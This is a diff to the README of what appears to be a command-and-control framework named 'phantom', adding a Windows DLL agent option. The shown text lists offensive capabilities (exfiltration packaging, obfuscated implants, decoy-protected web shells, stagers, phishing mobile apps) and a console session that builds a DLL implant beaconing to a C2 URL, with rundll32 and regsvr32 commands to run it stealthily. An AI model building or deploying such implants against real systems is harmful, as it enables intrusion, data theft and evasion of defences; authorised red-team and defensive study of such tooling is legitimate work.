@@ -150,7 +150,7 @@
 - **Data packaging** — compress directories for efficient exfiltration
 
 **Payload Generation (26+ types)**
-- **Agent binaries** — Windows EXE, Linux ELF, garble-obfuscated
+- **Agent binaries** — Windows EXE, Windows DLL (sideload/rundll32/regsvr32), Linux ELF, garble-obfuscated
 - **Web shells** — ASPX, PHP, JSP (token-protected with 404 decoy)
 - **Stagers** — PowerShell, Bash, Python, HTA, VBA macro
 - **Mobile** — Android APK builder (30+ fake app templates), iOS MDM + phishing
@@ -526,6 +526,19 @@ phantom > generate exe https://your-c2.com:443
   Platform:    windows/amd64
   Listener:    https://your-c2.com:443
   Sleep:       10s / 20%
+
+phantom > generate dll https://your-c2.com:443
+[*] Building windows/amd64 DLL agent...
+[*] Build mode: c-shared — sideloadable Windows DLL
+[*] Exports: Start (rundll32), DllInstall (regsvr32 /i), DllRegisterServer (regsvr32)
+[+] Agent built successfully!
+  Output:      build/agents/phantom-agent_windows_amd64.dll
+  Size:        6.6 MB
+
+Execution methods:
+  rundll32.exe phantom-agent_windows_amd64.dll,Start
+  regsvr32 /s /i phantom-agent_windows_amd64.dll
+  regsvr32 /s phantom-agent_windows_amd64.dll
 ```
 
 ### From Make
